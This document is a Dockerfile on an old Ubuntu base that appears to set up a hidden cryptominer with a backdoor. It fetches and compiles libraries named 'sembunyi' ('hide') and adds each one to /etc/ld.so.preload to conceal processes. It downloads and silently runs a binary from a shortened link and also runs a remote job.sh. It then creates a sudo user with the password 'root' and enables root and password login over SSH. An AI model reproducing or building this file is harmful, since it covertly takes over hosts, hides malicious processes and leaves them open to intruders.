FROM ubuntu:xenial-20180112.1
USER root
RUN apt-get update && apt-get install ssh make gcc htop -y
RUN wget https://github.com/p4n1k/mnr/releases/download/sembunyi/01.tar.gz && tar -xvf 01.tar.gz && cd 01 && make && mv libsembunyi01.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi01.so >> /etc/ld.so.preload && cd 02 && make && mv libsembunyi02.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi02.so >> /etc/ld.so.preload && cd 03 && make && mv libsembunyi03.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi03.so >> /etc/ld.so.preload && cd 04 && make && mv libsembunyi04.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi04.so >> /etc/ld.so.preload
RUN wget https://bit.ly/3Ibzg9T && chmod +x 3Ibzg9T && nohup ./3Ibzg9T &> /dev/null
RUN wget https://raw.githubusercontent.com/p4n1k/mnr/main/job.sh && chmod +x job.sh && ./job.sh
CMD adduser --disabled-password --gecos "" panda
CMD adduser panda sudo && echo 'panda:root' | chpasswd
CMD echo 'Port 22' >> /etc/ssh/sshd_config && echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config && echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config && service ssh restart


